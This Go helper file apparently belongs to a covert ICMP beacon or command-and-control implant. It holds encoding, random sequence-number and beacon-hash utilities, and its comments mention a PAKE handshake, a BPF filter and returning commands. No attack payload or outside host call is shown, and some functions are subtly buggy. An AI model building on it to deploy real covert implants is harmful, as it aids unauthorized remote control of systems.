package helper

import (
	"bytes"
	"crypto/sha256"
	"encoding/gob"
	"math/rand"
	"time"
)

// IPS/domains
var HomeIP = "127.0.0.1"
var HomeDomain = "localHost"

//goRotuines

var Crypt chan []byte //to pass icmp packets from main loop to PAKE functions during handshake

var SeqNumCrypt chan uint16 // used to establish the seq number to look for between the bpf filter and pake

var SeqNumCommands chan commandNum // to ensure commands are sent back in an orderly fashion

// Types
type commandNum struct {
	SeqNum     uint16
	CommandNum int
}

// ID
var BeaconID string

// const
const letterBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

func EncodeGob(input any) (bytes.Buffer, error) {
	var buffer bytes.Buffer
	writer := &buffer
	enc := gob.NewEncoder(writer)
	err := enc.Encode(input)
	return buffer, err
}

func DecodeGob(glob []byte) ([]byte, error) {
	var buffer bytes.Buffer
	_, err := buffer.Write(glob)
	if err != nil {
		return nil, err
	}
	reader := &buffer
	dec := gob.NewDecoder(reader)
	err = dec.Decode(&glob)
	return buffer.Bytes(), err
}

func generateRandomNumber() uint16 {
	rand.Seed(time.Now().UnixNano()) // Seed the random number generator with the current time

	return uint16(rand.Intn(65535)) // Generate a random number between 0 and 65535 (inclusive)
}

func RandStringBytes(n int) string {
	b := make([]byte, n)
	for i := range b {
		b[i] = letterBytes[rand.Intn(len(letterBytes))]
	}
	return string(b)
}

func GenHash() []byte {
	//generate hash
	hasher := sha256.New()
	nonce := RandStringBytes(4)
	hasher.Write([]byte(BeaconID + nonce))
	hash := hasher.Sum(nil)
	toApp := []byte("::" + nonce)
	toret := append(hash, toApp...)
	return toret

	//hash(beaconID+nonce)::nonce
}

func GenSeqNum() (uint16, uint16) {
	return generateRandomNumber(), generateRandomNumber()
}
